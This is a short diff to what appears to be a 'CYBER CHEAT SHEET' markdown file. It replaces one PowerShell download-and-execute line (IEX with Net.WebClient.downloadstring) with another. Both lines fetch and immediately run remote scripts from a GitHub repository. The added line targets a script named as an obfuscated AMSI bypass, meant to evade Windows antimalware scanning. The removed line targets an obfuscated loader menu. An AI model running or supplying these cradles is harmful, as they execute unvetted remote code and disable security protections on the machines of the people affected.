@@ -3,7 +3,7 @@
 $key need to be set
 
 ```
-IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/TikTakTech/Salsa/main/KP_Obf_LOAD_Menu.ps1')
+IEX(New-Object Net.WebClient).downloadstring('https://github.com/TikTakTech/Salsa/blob/main/KP_Obf_ISMA_Bypass_Salsa.ps1')
 ```
 
 # CYBER CHEAT SHEET
